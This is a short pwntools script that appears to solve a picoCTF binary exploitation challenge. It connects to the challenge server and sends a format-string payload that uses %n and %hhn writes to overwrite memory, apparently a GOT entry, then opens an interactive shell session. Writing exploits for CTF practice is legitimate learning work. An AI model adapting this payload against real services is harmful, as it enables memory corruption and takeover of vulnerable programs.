from pwn import *

HOST, PORT = 'wily-courier.picoctf.net', 59777
r = remote(HOST, PORT)
# r = process('./vuln')

r.sendline('1')
payload = flat(
    '%c' * 10,
    f'%{0x602018-10}c%n',
    f'%{0xf0-0x18}c%20$hhn',
    f'%{10504067}c%18$n'
    )
r.sendline(payload)

r.interactive()